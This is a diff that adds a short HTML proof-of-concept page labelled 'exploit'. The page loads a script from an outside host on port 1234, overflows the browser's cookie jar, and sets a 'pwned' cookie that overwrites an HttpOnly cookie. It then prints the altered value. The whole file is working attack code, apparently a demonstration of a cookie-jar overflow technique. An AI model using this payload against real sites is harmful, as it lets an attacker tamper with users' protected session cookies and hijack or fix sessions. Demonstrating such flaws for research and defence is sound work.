@@ -1,0 +1,13 @@
+<html>
+    <div id="exploit"></div>
+    <script src="http://cookies.gtfo.bar:1234/cookie.js"></script>
+    <script>
+        overflowCookieJar();
+        setCookie("pwned");
+        clearCookieJar();
+
+        var exploit = document.getElementById("exploit");
+        exploit.innerHTML = "You HttpOnly cookie has been changed to <br><i>" + document.cookie + "</i><br>";
+    </script>
+    <a href="http://cookies.gtfo.bar:1234">Root</a>
+</html>
